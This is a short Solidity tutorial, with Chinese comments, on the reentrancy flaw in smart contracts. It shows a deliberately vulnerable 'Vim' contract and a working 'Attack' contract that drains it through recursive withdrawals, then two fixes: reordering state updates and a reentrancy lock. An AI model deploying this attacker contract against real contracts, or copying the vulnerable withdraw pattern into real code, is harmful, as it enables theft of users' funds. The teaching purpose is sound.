```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.10;

contract Vim {
    event Received(address caller, uint amount, string message);

    event Response(bool success, bytes data);

    mapping (address => uint) account;

    function save() public payable {
        account[msg.sender] += msg.value;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getAddress() public view returns(address) {
        return address(this);
    }

    function readme() public view returns (uint) {
        return account[msg.sender];
    }

    function withDraw(uint amount) external payable {
				//由于对变量的校验放在递归结构之前，在执行完递归逻辑之前变量都不会被修改，形成reentrancy攻击
        require(account[msg.sender] >= amount, "insuff...");
        uint yue = address(this).balance;
        (bool success,) = msg.sender.call{value:amount}("");

        require(success, "fail,,,,");
				//此处由于低版本不会检查int溢出，msg.sender自减过程永远不会报错
				//如果是8.0版本或mathsafe，会校验int的溢出问题，如果这里报错，那么所有状态回滚，攻击不成立
        account[msg.sender] -= amount;
				//8.0中 account[msg.sender] = 0 如此也可以触发攻击
    }

    receive() external payable {
        emit Received(msg.sender, msg.value, "vim Receive");
    }
}

contract Attack {
    Vim vim;

    event Received(address caller, uint amount, string message);

    function setKittyContractAddress(address _address) external {
        vim = Vim(payable(_address));
    }

    function save() external payable {
        vim.save{value:msg.value}();
    }

    function withDraw(uint amount) external payable {
        vim.withDraw(amount);
    }

    //attack
		//此处代码和vim.withdraw相互递归调用
		//withdraw递归的控制权交由外部
    receive() external payable {
        emit Received(msg.sender, msg.value, "att Receive");

        if (vim.getBalance() > 2 ether) {
            vim.withDraw(1 ether);
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getAddress() public view returns(address) {
        return address(this);
    }

    function getStoreBalance() public view returns (uint) {
        return vim.getBalance();
    }

    function readme() public view returns (uint) {
        return vim.readme();
    }
}
```

解决方法

1. 调整执行顺序，将可能形成递归的结构放在最后，对变量的修改放在之前

```solidity
function withDraw(uint amount) external payable {
        require(account[msg.sender] >= amount, "insuff...");
        account[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value:amount}("");
				//这里需要校验，如果不校验，会出现amount减少但转账不成功的情况
        require(success, "wi fail...");
    }
```

2. 使用内部锁

```solidity
	bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
```